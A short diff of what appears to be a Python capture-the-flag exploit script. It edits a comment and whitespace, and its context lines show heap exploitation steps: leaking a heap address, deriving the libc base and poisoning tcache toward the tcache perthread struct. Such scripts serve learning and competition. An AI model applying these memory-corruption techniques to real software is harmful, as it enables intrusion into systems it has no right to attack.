@@ -181,7 +181,7 @@ while True:
 
     print("Leaking heap address")
     AddVulnType(0x100, b'A', 0)
-    AddVulnType(0x100, b'B', 0) # This only works since calloc skip tcache
+    AddVulnType(0x100, b'B', 0) # This works since calloc skip tcache entirely
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'C')
@@ -206,7 +206,7 @@ while True:
     ru(p, b'type: ')
     libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ebc00)
     lg("libc base", libc.address)
-    
+
     print("Poison tcache to point back to tcache perthread struct")
     
     # For some reasons, without debug being turned on, we're blocked here (LOCAL)
